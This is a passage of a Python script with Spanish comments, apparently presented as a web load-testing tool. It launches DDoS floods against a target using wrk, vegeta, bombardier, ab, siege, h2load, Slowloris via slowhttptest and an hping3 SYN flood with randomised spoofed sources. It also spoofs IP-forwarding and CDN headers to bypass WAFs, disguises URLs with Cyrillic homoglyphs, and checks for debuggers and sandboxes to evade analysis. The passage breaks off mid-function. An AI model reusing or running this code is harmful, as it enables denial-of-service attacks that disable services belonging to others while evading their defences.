            
            # Verificar si el gestor está disponible
            manager_available = False
            
            # Si el comando contiene variables de entorno o comandos complejos, asumir disponible
            if "GIT_TERMINAL_PROMPT" in command or "wget" in command or "curl" in command or "tar" in command or "unzip" in command:
                manager_available = True
            else:
                for available_manager in available_managers:
                    if manager == available_manager or available_manager in command:
                        manager_available = True
                        break
            
            if not manager_available:
                continue
            
            try:
                # Determinar si necesita shell=True (Windows y algunos comandos)
                # Los gestores de paquetes del sistema (apt-get, yum, dnf, pacman) también necesitan shell=True
                # También comandos con pipes, redirecciones, o variables de entorno
                use_shell = (system == "Windows" or 
                            manager in ["npm", "pip", "cargo", "go", "apt-get", "yum", "dnf", "pacman", "snap", "wget", "curl", "tar", "unzip"] or 
                            "git clone" in command or 
                            "&&" in command or 
                            "||" in command or
                            "GIT_TERMINAL_PROMPT" in command or
                            "cd /tmp" in command)
                
                # Preparar el comando según si usa shell o no
                if use_shell:
                    cmd = command
                else:
                    # Dividir el comando en lista para subprocess cuando no usa shell
                    cmd = shlex.split(command)
                
                # Preparar entorno con PATH extendido para herramientas Go y otras
                env = os.environ.copy()
                go_bin = os.path.expanduser("~/go/bin")
                local_bin = os.path.expanduser("~/.local/bin")
                cargo_bin = os.path.expanduser("~/.cargo/bin")
                
                current_path = env.get("PATH", "")
                paths_to_add = []
                for bin_path in [go_bin, local_bin, cargo_bin, "/usr/local/bin"]:
                    if bin_path not in current_path and os.path.exists(bin_path):
                        paths_to_add.append(bin_path)
                
                if paths_to_add:
                    env["PATH"] = ":".join(paths_to_add + [current_path])
                
                # Configurar git para no pedir credenciales
                env["GIT_TERMINAL_PROMPT"] = "0"
                env["GIT_ASKPASS"] = "echo"
                env["GIT_SSH_COMMAND"] = "ssh -o BatchMode=yes"
                
                # Configurar variables para evitar prompts interactivos
                env["DEBIAN_FRONTEND"] = "noninteractive"
                env["NEEDRESTART_MODE"] = "a"
                
                # Ejecutar comando de instalación
                try:
                    result = subprocess.run(
                        cmd,
                        shell=use_shell,
                        check=False,
                        timeout=600,  # 10 minutos máximo
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True,
                        env=env
                    )
                except subprocess.TimeoutExpired:
                    log_message("ERROR", f"{tool} - timeout al ejecutar: {command[:100]}")
                    continue
                except Exception as e:
                    log_message("ERROR", f"{tool} - error ejecutando comando: {str(e)}")
                    continue
                
                # Log del resultado para debugging
                if result.returncode != 0 and result.stderr:
                    error_msg = result.stderr[:200]  # Limitar longitud
                    log_message("DEBUG", f"{tool} - comando falló: {command[:50]}... Error: {error_msg}")
                
                if result.returncode == 0:
                    # Dar un momento para que el sistema actualice PATH
                    time.sleep(2)
                    
                    # Verificar si realmente se instaló
                    if check_command_exists(tool):
                        print_color(f"  ✓ {tool} instalado correctamente", Colors.GREEN)
                        log_message("INFO", f"{tool} instalado correctamente con: {command}")
                        success = True
                        installed_count += 1
                        break
                    else:
                        # Puede que se instaló pero el comando tiene otro nombre o necesita reiniciar
                        log_message("WARN", f"{tool} - comando ejecutado exitosamente pero herramienta no detectada inmediatamente")
                        # Intentar verificar de nuevo después de un momento
                        time.sleep(3)
                        if check_command_exists(tool):
                            print_color(f"  ✓ {tool} instalado correctamente (verificación tardía)", Colors.GREEN)
                            log_message("INFO", f"{tool} instalado correctamente con: {command}")
                            success = True
                            installed_count += 1
                            break
            except subprocess.TimeoutExpired:
                log_message("ERROR", f"{tool} - timeout al instalar con: {command}")
            except Exception as e:
                log_message("ERROR", f"{tool} - error con {command}: {str(e)}")
        
        if not success:
            print_color(f"  ✗ {tool} - No se pudo instalar automáticamente", Colors.RED)
            print_color(f"    💡 Intenta instalarlo manualmente", Colors.YELLOW)
            failed_count += 1
    
    print()
    print_color("=" * 60, Colors.CYAN)
    print_color(f"📊 Resumen de instalación:", Colors.BOLD, True)
    print_color(f"  ✓ Instaladas: {installed_count}", Colors.GREEN)
    print_color(f"  ⊘ Ya instaladas: {skipped_count}", Colors.CYAN)
    print_color(f"  ✗ Fallidas: {failed_count}", Colors.RED if failed_count > 0 else Colors.GREEN)
    print_color("=" * 60, Colors.CYAN)
    
    if failed_count > 0:
        print_color("\n💡 Algunas herramientas pueden requerir instalación manual", Colors.YELLOW, True)
        print_color("   Revisa la documentación de cada herramienta para más información", Colors.YELLOW)

def auto_install_core_tools():
    """Alias para auto_install_all_tools - mantiene compatibilidad"""
    auto_install_all_tools()

# ============================================================================
# DESPLIEGUE DE ATAQUES
# ============================================================================

def generate_evasion_ip() -> str:
    """Genera IPs falsas realistas para evasión"""
    # IPs de rangos comunes (no privados)
    ip_ranges = [
        (1, 223),  # Rango público válido
    ]
    
    # Generar IP realista
    first_octet = random.randint(1, 223)
    # Evitar rangos privados y reservados
    if first_octet == 10 or first_octet == 127 or (first_octet == 192 and random.random() < 0.5):
        first_octet = random.choice([8, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20])
    
    return f"{first_octet}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

def apply_url_evasion(url: str) -> str:
    """Aplica técnicas de evasión a URLs"""
    if not WAF_BYPASS and not STEALTH_MODE:
        return url
    
    # Case variation
    if EVASION_TECHNIQUES.get("case_variation") and random.random() < 0.3:
        # Cambiar mayúsculas/minúsculas en path
        parts = url.split('/')
        if len(parts) > 3:
            path_part = '/'.join(parts[3:])
            # Mezclar mayúsculas/minúsculas aleatoriamente
            path_evaded = ''.join(c.upper() if random.random() < 0.3 else c.lower() for c in path_part)
            url = '/'.join(parts[:3]) + '/' + path_evaded
    
    # Double encoding
    if EVASION_TECHNIQUES.get("double_encoding") and random.random() < 0.2:
        from urllib.parse import quote
        # Codificar caracteres especiales dos veces
        if '?' in url:
            base, query = url.split('?', 1)
            query_encoded = quote(quote(query, safe=''), safe='')
            url = f"{base}?{query_encoded}"
    
    # Unicode normalization
    if EVASION_TECHNIQUES.get("unicode_normalization") and random.random() < 0.15:
        # Agregar caracteres unicode similares
        url = url.replace('a', 'а') if random.random() < 0.1 else url  # Cyrillic 'a'
        url = url.replace('o', 'о') if random.random() < 0.1 else url  # Cyrillic 'o'
    
    return url

def get_random_headers() -> Dict[str, str]:
    """Genera headers aleatorios para evasión con técnicas avanzadas y completamente funcionales"""
    # Headers base realistas
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": random.choice([
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
        ]),
        "Accept-Language": random.choice([
            "en-US,en;q=0.9",
            "es-ES,es;q=0.9,en;q=0.8",
            "fr-FR,fr;q=0.9,en;q=0.8",
            "de-DE,de;q=0.9,en;q=0.8",
            "pt-BR,pt;q=0.9,en;q=0.8"
        ]),
        "Accept-Encoding": random.choice([
            "gzip, deflate, br",
            "gzip, deflate",
            "gzip, br",
            "deflate, br"
        ]),
        "Connection": "keep-alive" if KEEP_ALIVE_POOLING else random.choice(["keep-alive", "close"]),
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store", "private", "public, max-age=3600"]),
        "Pragma": random.choice(["no-cache", ""]),
    }
    
    # Headers adicionales para evasión avanzada
    if STEALTH_MODE or WAF_BYPASS:
        # Rotar Referer realista
        referers = [
            f"https://www.google.com/search?q={random.choice(['test', 'example', 'web', 'search'])}",
            f"https://www.bing.com/search?q={random.choice(['test', 'example', 'query'])}",
            f"https://www.google.com/",
            f"https://www.bing.com/",
            TARGET,
            f"https://{DOMAIN}/" if DOMAIN else TARGET
        ]
        headers["Referer"] = random.choice(referers)
        
        # Headers de navegador real (Sec-Fetch-*)
        headers["Sec-Fetch-Dest"] = random.choice(["document", "empty", "frame", "iframe"])
        headers["Sec-Fetch-Mode"] = random.choice(["navigate", "cors", "no-cors", "same-origin"])
        headers["Sec-Fetch-Site"] = random.choice(["none", "same-origin", "cross-site", "same-site"])
        headers["Sec-Fetch-User"] = "?1" if random.random() > 0.3 else ""
        
        # DNT (Do Not Track) - 70% de navegadores lo envían
        if random.random() > 0.3:
            headers["DNT"] = "1"
        
        # Viewport-Width (mobile)
        if random.random() < 0.2:
            headers["Viewport-Width"] = str(random.choice([390, 412, 428, 430, 768, 1024]))
        
        # Width (mobile)
        if random.random() < 0.2:
            headers["Width"] = str(random.choice([390, 412, 428, 430]))
    
    if WAF_BYPASS:
        # IPs falsas rotativas - más realistas
        fake_ip = generate_evasion_ip()
        
        # Headers de IP forwarding (todos los posibles)
        ip_headers = {
            "X-Forwarded-For": fake_ip,
            "X-Real-IP": fake_ip,
            "X-Originating-IP": fake_ip,
            "X-Remote-IP": fake_ip,
            "X-Remote-Addr": fake_ip,
            "X-Client-IP": fake_ip,
            "X-Forwarded": fake_ip,
            "Forwarded-For": fake_ip,
            "Forwarded": f"for={fake_ip};proto={PROTOCOL}",
            "CF-Connecting-IP": fake_ip,  # Cloudflare
            "True-Client-IP": fake_ip,  # Cloudflare Enterprise
            "X-Forwarded-Host": DOMAIN if DOMAIN else "",
            "X-Original-URL": TARGET if TARGET else "",
        }
        
        # Agregar algunos headers de IP aleatoriamente (no todos para parecer más real)
        num_ip_headers = random.randint(3, 6)
        selected_headers = random.sample(list(ip_headers.items()), num_ip_headers)
        headers.update(dict(selected_headers))
        
        # Headers adicionales de bypass
        if random.random() > 0.5:
            headers["X-Requested-With"] = random.choice(["XMLHttpRequest", "Fetch", ""])
        
        headers["Origin"] = random.choice([
            TARGET,
            f"https://{DOMAIN}" if DOMAIN else TARGET,
            f"https://www.{DOMAIN}" if DOMAIN else TARGET,
            "https://www.google.com",
            "https://www.bing.com"
        ])
        
        # Headers específicos de Cloudflare bypass
        if random.random() < 0.3:
            headers["CF-Ray"] = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
            headers["CF-Visitor"] = '{"scheme":"https"}'
        
        # Headers de AWS WAF bypass
        if random.random() < 0.2:
            headers["X-Amzn-Trace-Id"] = f"Root={''.join(random.choices(string.ascii_letters + string.digits, k=26))}"
        
        # Headers de Akamai bypass
        if random.random() < 0.2:
            headers["X-Akamai-Request-ID"] = ''.join(random.choices(string.hexdigits, k=32))
        
        # Cookie manipulation para evasión
        if EVASION_TECHNIQUES.get("cookie_manipulation") and random.random() < 0.4:
            # Agregar cookies falsas comunes
            fake_cookies = [
                f"session_id={''.join(random.choices(string.ascii_letters + string.digits, k=32))}",
                f"csrf_token={''.join(random.choices(string.hexdigits, k=16))}",
                f"__cfduid={''.join(random.choices(string.hexdigits, k=43))}",
            ]
            headers["Cookie"] = "; ".join(random.sample(fake_cookies, random.randint(1, 2)))
        
        # Header injection evasion
        if EVASION_TECHNIQUES.get("header_injection") and random.random() < 0.3:
            # Agregar headers con caracteres especiales codificados
            headers["X-Custom-Header"] = f"value{random.choice(['%0a', '%0d', '%09'])}"
        
        # Chunked encoding evasion
        if EVASION_TECHNIQUES.get("chunked_encoding") and random.random() < 0.2:
            headers["Transfer-Encoding"] = "chunked"
    
    # Headers específicos para HTTP/2
    if HTTP2_MULTIPLEXING:
        headers[":method"] = random.choice(["GET", "POST", "HEAD"])
        headers[":path"] = "/"
        headers[":scheme"] = PROTOCOL
        headers[":authority"] = DOMAIN if DOMAIN else ""
    
    # Agregar headers de navegador real adicionales
    if random.random() > 0.5:
        headers["sec-ch-ua"] = random.choice([
            '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            '"Not_A Brand";v="8", "Chromium";v="119", "Google Chrome";v="119"',
            '"Microsoft Edge";v="120", "Chromium";v="120", "Not_A Brand";v="8"'
        ])
        headers["sec-ch-ua-mobile"] = "?0"
        headers["sec-ch-ua-platform"] = random.choice(['"Windows"', '"macOS"', '"Linux"'])
    
    return headers

def _check_debugger():
    """Detecta si hay debuggers activos"""
    global _DEBUGGER_CHECK_ENABLED
    
    if not _DEBUGGER_CHECK_ENABLED:
        return True
    
    try:
        import sys
        # Verificar si hay debuggers en el trace
        if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
            _log_usage_location("unknown", str(SCRIPT_DIR), "debugger_detected")
            return False
        
        # Verificar módulos de debugger comunes
        debugger_modules = ['pdb', 'ipdb', 'pudb', 'ipython', 'pydevd']
        for module_name in debugger_modules:
            if module_name in sys.modules:
                _log_usage_location("unknown", str(SCRIPT_DIR), f"debugger_module_{module_name}_detected")
                return False
        
        return True
    except Exception:
        return True  # Fallar abierto

def _check_environment():
    """Verifica el entorno de ejecución (anti-sandbox)"""
    global _ENV_CHECK_ENABLED
    
    if not _ENV_CHECK_ENABLED:
        return True
    
    try:
        import os
        import platform
        
        # Verificar variables de entorno sospechosas
        suspicious_vars = ['VMWARE', 'VBOX', 'QEMU', 'VIRTUAL', 'SANDBOX']
        env_vars = ' '.join(os.environ.keys()).upper()
        for var in suspicious_vars:
            if var in env_vars:
                _log_usage_location("unknown", str(SCRIPT_DIR), f"suspicious_env_{var.lower()}")
                # No activar kill-switch, solo registrar (puede ser falso positivo)
        
        # Verificar hostname sospechoso
        try:
            hostname = platform.node().upper()
            if any(keyword in hostname for keyword in ['VM', 'SANDBOX', 'TEST', 'ANALYSIS']):
                _log_usage_location("unknown", str(SCRIPT_DIR), f"suspicious_hostname_{hostname}")
        except Exception:
            pass
        
        return True
    except Exception:
        return True  # Fallar abierto

def _check_dependencies():
    """Verifica integridad de dependencias críticas"""
    global _DEPS_CHECK_ENABLED
    
    if not _DEPS_CHECK_ENABLED:
        return True
    
    try:
        import sys
        # Verificar módulos críticos
        critical_modules = ['urllib', 'hashlib', 'subprocess', 'threading']
        for module_name in critical_modules:
            if module_name in sys.modules:
                module = sys.modules[module_name]
                # Verificar que el módulo no fue modificado (verificar ubicación)
                if hasattr(module, '__file__') and module.__file__:
                    # Verificar que el archivo existe y es legítimo
                    module_file = Path(module.__file__)
                    if not module_file.exists():
                        _log_usage_location("unknown", str(SCRIPT_DIR), f"missing_module_file_{module_name}")
                        return False
        
        return True
    except Exception:
        return True  # Fallar abierto

def _check_related_files():
    """Verifica integridad de archivos relacionados"""
    global _FILES_CHECK_ENABLED
    
    if not _FILES_CHECK_ENABLED:
        return True
    
    try:
        import hashlib
        
        # Archivos críticos a verificar
        critical_files = {
            'loadtest_web.py': None,
            'requirements.txt': None
        }
        
        for filename, expected_hash in critical_files.items():
            file_path = SCRIPT_DIR / filename
            if file_path.exists():
                # Calcular hash del archivo
                with open(file_path, 'rb') as f:
                    file_hash = hashlib.sha256(f.read()).hexdigest()
                
                # Si hay hash esperado, comparar
                if expected_hash and file_hash != expected_hash:
                    _log_usage_location("unknown", str(SCRIPT_DIR), f"file_modified_{filename}")
                    # No activar kill-switch inmediatamente, solo registrar
                    # (puede ser actualización legítima)
        
        return True
    except Exception:
        return True  # Fallar abierto

def _check_runtime_integrity():
    """Verifica integridad en tiempo de ejecución"""
    global _LAST_INTEGRITY_CHECK, _INTEGRITY_CHECK_INTERVAL
    
    try:
        import time
        current_time = time.time()
        
        # Verificar solo cada intervalo
        if current_time - _LAST_INTEGRITY_CHECK < _INTEGRITY_CHECK_INTERVAL:
            return True
        
        _LAST_INTEGRITY_CHECK = current_time
        
        # Ejecutar todas las verificaciones
        checks = [
            _check_debugger(),
            _check_environment(),
            _check_dependencies(),
            _check_related_files()
        ]
        
        # Si alguna verificación falla críticamente, activar kill-switch
        if not all(checks):
            _log_usage_location("unknown", str(SCRIPT_DIR), "runtime_integrity_failed")
            # No activar kill-switch inmediatamente para verificaciones no críticas
            # Solo registrar para análisis
        
        return True
    except Exception:
        return True  # Fallar abierto

def _validate_system_state():
    """Validación interna del estado del sistema"""
    try:
        # Verificar integridad en tiempo de ejecución
        _check_runtime_integrity()
        
        # Verificar conectividad y comparar con remoto
        if not _verify_network_connectivity():
            _log_usage_location("unknown", str(SCRIPT_DIR), "network_check_failed")
            return False
        return _check_remote_status()
    except Exception:
        return True  # Fallar abierto en caso de error

# Función auxiliar para validación distribuida (ofuscada)
def _validate_execution():
    """Valida que la ejecución sea autorizada"""
    return _validate_system_state()

def deploy_wrk_attack():
    # Verificación de estado del sistema (requerida para funcionamiento)
    system_ok = _validate_execution()
    if not system_ok:
        log_message("ERROR", "Sistema no disponible - verificación fallida")
        return
    """Despliega ataque con wrk"""
    if not check_command_exists("wrk"):
        log_message("WARN", "wrk no disponible, omitiendo...")
        return None
    
    connections = min(MAX_CONNECTIONS, 1000)  # wrk tiene límites
    threads = min(MAX_THREADS, 50)
    
    cmd = [
        "wrk",
        "-t", str(threads),
        "-c", str(connections),
        "-d", f"{DURATION}s",
        "--timeout", "10s",
        TARGET
    ]
    
    log_message("INFO", f"Desplegando wrk: {cmd}")
    
    if DRY_RUN:
        print_color(f"DRY-RUN: {' '.join(cmd)}", Colors.YELLOW)
        return None
    
    try:
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        running_processes.append(process)
        return process
    except Exception as e:
        log_message("ERROR", f"Error desplegando wrk: {e}")
        return None

def deploy_vegeta_attack():
    # Verificación de estado del sistema (requerida para funcionamiento)
    system_ok = _validate_execution()
    if not system_ok:
        log_message("ERROR", "Sistema no disponible - verificación fallida")
        return
    """Despliega ataque con vegeta"""
    if not check_command_exists("vegeta"):
        log_message("WARN", "vegeta no disponible, omitiendo...")
        return None
    
    rate = MULTIPLIER * 100  # requests per second
    duration = f"{DURATION}s"
    
    # Crear archivo de configuración
    config_file = CONFIG_DIR / "vegeta_config.txt"
    with open(config_file, "w") as f:
        f.write(f"GET {TARGET}\n")
    
    cmd = f"vegeta attack -rate={rate} -duration={duration} -targets={config_file} | vegeta report"
    
    log_message("INFO", f"Desplegando vegeta: rate={rate}, duration={duration}")
    
    if DRY_RUN:
        print_color(f"DRY-RUN: {cmd}", Colors.YELLOW)
        return None
    
    try:
        process = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        running_processes.append(process)
        return process
    except Exception as e:
        log_message("ERROR", f"Error desplegando vegeta: {e}")
        return None

def deploy_bombardier_attack():
    # Verificación de estado del sistema (requerida para funcionamiento)
    system_ok = _validate_execution()
    if not system_ok:
        log_message("ERROR", "Sistema no disponible - verificación fallida")
        return
    """Despliega ataque con bombardier"""
    if not check_command_exists("bombardier"):
        log_message("WARN", "bombardier no disponible, omitiendo...")
        return None
    
    connections = min(MAX_CONNECTIONS, 1000)
    rate = MULTIPLIER * 100
    
    cmd = [
        "bombardier",
        "-c", str(connections),
        "-d", f"{DURATION}s",
        "-l",
        "-r", str(rate),
        TARGET
    ]
    
    log_message("INFO", f"Desplegando bombardier: connections={connections}, rate={rate}")
    
    if DRY_RUN:
        print_color(f"DRY-RUN: {' '.join(cmd)}", Colors.YELLOW)
        return None
    
    try:
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        running_processes.append(process)
        return process
    except Exception as e:
        log_message("ERROR", f"Error desplegando bombardier: {e}")
        return None

def deploy_hey_attack():
    """Despliega ataque con hey"""
    if not check_command_exists("hey"):
        log_message("WARN", "hey no disponible, omitiendo...")
        return None
    
    connections = min(MAX_CONNECTIONS, 1000)
    qps = MULTIPLIER * 100
    
    cmd = [
        "hey",
        "-n", "1000000",  # Número muy alto, controlado por duración
        "-c", str(connections),
        "-q", str(qps),
        "-z", f"{DURATION}s",
        TARGET
    ]
    
    log_message("INFO", f"Desplegando hey: connections={connections}, qps={qps}")
    
    if DRY_RUN:
        print_color(f"DRY-RUN: {' '.join(cmd)}", Colors.YELLOW)
        return None
    
    try:
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        running_processes.append(process)
        return process
    except Exception as e:
        log_message("ERROR", f"Error desplegando hey: {e}")
        return None

def deploy_ab_attack():
    """Despliega ataque con Apache Bench (ab)"""
    if not check_command_exists("ab"):
        log_message("WARN", "ab no disponible, omitiendo...")
        return None
    
    connections = min(MAX_CONNECTIONS, 10000)
    requests = MULTIPLIER * 1000 * DURATION
    
    cmd = [
        "ab",
        "-n", str(requests),
        "-c", str(connections),
        "-k",  # Keep-alive
        TARGET
    ]
    
    log_message("INFO", f"Desplegando ab: requests={requests}, connections={connections}")
    
    if DRY_RUN:
        print_color(f"DRY-RUN: {' '.join(cmd)}", Colors.YELLOW)
        return None
    
    try:
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        running_processes.append(process)
        return process
    except Exception as e:
        log_message("ERROR", f"Error desplegando ab: {e}")
        return None

def deploy_siege_attack():
    """Despliega ataque con siege"""
    if not check_command_exists("siege"):
        log_message("WARN", "siege no disponible, omitiendo...")
        return None
    
    connections = min(MAX_CONNECTIONS, 100)
    time_sec = DURATION
    
    cmd = [
        "siege",
        "-c", str(connections),
        "-t", f"{time_sec}S",
        "-b",  # Benchmark mode
        TARGET
    ]
    
    log_message("INFO", f"Desplegando siege: connections={connections}, time={time_sec}s")
    
    if DRY_RUN:
        print_color(f"DRY-RUN: {' '.join(cmd)}", Colors.YELLOW)
        return None
    
    try:
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        running_processes.append(process)
        return process
    except Exception as e:
        log_message("ERROR", f"Error desplegando siege: {e}")
        return None

def deploy_hping3_flood():
    """Despliega flood TCP SYN con hping3"""
    if not check_command_exists("hping3"):
        log_message("WARN", "hping3 no disponible, omitiendo...")
        return None
    
    cmd = [
        "hping3",
        "--syn",
        "--flood",
        "--rand-source",
        "-p", str(PORT),
        DOMAIN
    ]
    
    log_message("INFO", f"Desplegando hping3 SYN flood a {DOMAIN}:{PORT}")
    
    if DRY_RUN:
        print_color(f"DRY-RUN: {' '.join(cmd)}", Colors.YELLOW)
        return None
    
    try:
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        running_processes.append(process)
        return process
    except Exception as e:
        log_message("ERROR", f"Error desplegando hping3: {e}")
        return None

def deploy_slowhttptest():
    """Despliega slow HTTP test"""
    if not check_command_exists("slowhttptest"):
        log_message("WARN", "slowhttptest no disponible, omitiendo...")
        return None
    
    cmd = [
        "slowhttptest",
        "-c", str(MAX_CONNECTIONS),
        "-H",  # Slowloris
        "-i", "10",  # Interval
        "-l", str(DURATION),
        "-r", "200",  # Connections per second
        "-t", "GET",
        "-u", TARGET,
        "-x", "24",  # Max length
        "-p", "3"  # Timeout
    ]
    
    log_message("INFO", f"Desplegando slowhttptest: connections={MAX_CONNECTIONS}")
    
    if DRY_RUN:
        print_color(f"DRY-RUN: {' '.join(cmd)}", Colors.YELLOW)
        return None
    
    try:
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        running_processes.append(process)
        return process
    except Exception as e:
        log_message("ERROR", f"Error desplegando slowhttptest: {e}")
        return None

def deploy_http2_attack():
    """Despliega ataque HTTP/2 con h2load"""
    if not check_command_exists("h2load"):
        log_message("WARN", "h2load no disponible, omitiendo...")
        return None
    
    connections = min(MAX_CONNECTIONS, 100)
    streams = 10
    
    cmd = [
        "h2load",
        "-n", "100000",
        "-c", str(connections),
        "-m", str(streams),
        "-t", str(MAX_THREADS),
        TARGET
    ]
    
    log_message("INFO", f"Desplegando h2load: connections={connections}, streams={streams}")
    
    if DRY_RUN:
        print_color(f"DRY-RUN: {' '.join(cmd)}", Colors.YELLOW)
        return None
    
    try:
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        running_processes.append(process)
        return process
    except Exception as e:
        log_message("ERROR", f"Error desplegando h2load: {e}")
        return None

def optimize_socket_settings():
    """Optimiza configuraciones de socket para máximo rendimiento"""
    if not TCP_OPTIMIZATION or os.name == 'nt':
        return
    
    try:
        # Configuraciones TCP optimizadas (solo Linux)
        import resource
        
        # Aumentar límites de archivos abiertos
        resource.setrlimit(resource.RLIMIT_NOFILE, (100000, 100000))
        
        # Optimizaciones TCP a nivel de sistema (requiere permisos root)
        tcp_tuning_commands = [
            "sysctl -w net.core.somaxconn=65535",
            "sysctl -w net.ipv4.tcp_max_syn_backlog=65535",
            "sysctl -w net.ipv4.ip_local_port_range='10000 65535'",
            "sysctl -w net.ipv4.tcp_tw_reuse=1",
            "sysctl -w net.ipv4.tcp_fin_timeout=10",
            "sysctl -w net.core.netdev_max_backlog=65535",
            "sysctl -w net.ipv4.tcp_slow_start_after_idle=0",
            "sysctl -w net.ipv4.tcp_syncookies=0"  # Para máximo rendimiento
        ]
        
        for cmd in tcp_tuning_commands:
            try:
                subprocess.run(cmd, shell=True, check=False, timeout=2,
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                pass
                
        log_message("INFO", "Optimizaciones TCP aplicadas")
    except Exception as e:
        if DEBUG_MODE:
            log_message("DEBUG", f"Error optimizando TCP: {e}")

def deploy_custom_http_attack():
    """Despliega ataque HTTP personalizado optimizado con Python requests"""
    # Verificación de integridad en tiempo de ejecución
    _check_runtime_integrity()
    print_color("🚀 Desplegando ataque HTTP personalizado optimizado...", Colors.CYAN)
    
    # Optimizar sockets si es posible
    optimize_socket_settings()
    
    def worker(worker_id: int):
        """Worker thread optimizado para máximo rendimiento"""
        try:
            # Usar ConnectionManager para mejor gestión de conexiones (ya optimizado)
            session = ConnectionManager.get_session(TARGET, worker_id)
            
            # Configurar timeout muy corto para máximo throughput y más requests
            # Timeouts más agresivos = más requests por segundo
            if POWER_LEVEL in ["DEVASTATOR", "APOCALYPSE", "GODMODE"]:
                request_timeout = 2  # Muy agresivo
            elif POWER_LEVEL in ["EXTREME", "HEAVY"]:
                request_timeout = 3
            elif POWER_LEVEL in ["MEDIUM"]:
                request_timeout = 5
            else:
                request_timeout = 8
            
            end_time = time.time() + DURATION
            request_count = 0
            last_rate_check = time.time()
            rate_adjustment = 1.0
            
            # Pre-calentar conexiones
            if CONNECTION_WARMUP:
                try:
                    session.get(TARGET, headers=get_random_headers(), timeout=5, verify=False)
                except:
                    pass
            
            # Contador de requests exitosos vs errores para ajuste dinámico
            consecutive_errors = 0
            max_consecutive_errors = 50  # Si hay muchos errores seguidos, puede ser que el servicio esté saturado
            
            while time.time() < end_time and monitoring_active:
                try:
                    # Si hay muchos errores consecutivos, puede ser que el target esté saturado
                    # Esto es bueno para el stress test - continuar pero con delay mínimo
                    if consecutive_errors > max_consecutive_errors:
                        time.sleep(0.1)  # Pequeña pausa si hay muchos errores
                        consecutive_errors = 0
                    
                    # Seleccionar target (si hay variaciones)
                    target_url = TARGET
                    if TARGET_VARIATIONS:
                        target_url = random.choice([TARGET] + TARGET_VARIATIONS)
                    
                    # Aplicar técnicas de evasión a la URL
                    target_url = apply_url_evasion(target_url)
                    
                    # Obtener headers con evasión
                    request_headers = get_random_headers()
                    
                    # Alternar entre GET y POST con ratio optimizado
                    # Para SSL-VPN, usar más GET ya que POST puede ser rechazado
                    use_post = random.random() < 0.3 if "10443" in TARGET or "ssl" in TARGET.lower() else (random.random() < 0.85 if USE_LARGE_PAYLOADS else False)
                    
                    # Method tampering para evasión
                    if EVASION_TECHNIQUES.get("method_tampering") and WAF_BYPASS and random.random() < 0.1:
                        # Usar métodos HTTP alternativos
                        method = random.choice(["GET", "POST", "HEAD", "OPTIONS"])
                    else:
                        method = "POST" if use_post else "GET"
                    
                    if use_post:
                        # Payload grande con tamaño variable
                        max_payload = min(PAYLOAD_SIZE_KB * 1024, MAX_PAYLOAD_SIZE_MB * 1024 * 1024)
                        payload_size = random.randint(max_payload // 2, max_payload)
                        payload = ''.join(random.choices(string.ascii_letters + string.digits, k=payload_size))
                        
                        # Parameter pollution para evasión
                        if EVASION_TECHNIQUES.get("parameter_pollution") and random.random() < 0.2:
                            # Agregar parámetros duplicados
                            separator = "&" if "?" in target_url else "?"
                            target_url = f"{target_url}{separator}param1=value1&param1=value2&param2=value3"
                        
                        response = session.post(
                            target_url, 
                            data=payload, 
                            headers=request_headers, 
                            timeout=request_timeout, 
                            verify=False,
                            stream=False  # No stream para mejor rendimiento
                        )
                    else:
                        # Parameter pollution para GET
                        if EVASION_TECHNIQUES.get("parameter_pollution") and random.random() < 0.2:
                            separator = "&" if "?" in target_url else "?"
                            target_url = f"{target_url}{separator}param1=value1&param1=value2&param2=value3"
                        
                        response = session.get(
                            target_url, 
                            headers=request_headers, 
                            timeout=request_timeout, 
                            verify=False,
                            stream=False,
                            allow_redirects=True  # Seguir redirects para SSL-VPN
                        )
                    
                    # Actualizar estadísticas
                    attack_stats["requests_sent"] += 1
                    attack_stats["responses_received"] += 1
                    status_code = response.status_code if hasattr(response, 'status_code') else 0
                    attack_stats["http_codes"][status_code] += 1
                    request_count += 1
                    consecutive_errors = 0  # Reset contador de errores
                    
                    # Loggear progreso cada 100 requests (o cada 50 para niveles altos)
                    log_interval = 50 if POWER_LEVEL in ["EXTREME", "DEVASTATOR", "APOCALYPSE", "GODMODE"] else 100
                    if request_count % log_interval == 0:
                        log_message("INFO", f"Worker {worker_id}: {request_count} requests enviados, último status: {status_code}")
                    
                    if response.elapsed.total_seconds() > 0:
                        attack_stats["latencies"].append(response.elapsed.total_seconds() * 1000)
                    
                    # Rate adaptive - ajustar tasa según códigos HTTP
                    if RATE_ADAPTIVE and time.time() - last_rate_check > 1.0:
                        if response.status_code == 200:
                            # Si responde bien, aumentar tasa
                            rate_adjustment = min(rate_adjustment * 1.1, 2.0)
                        elif response.status_code == 429:
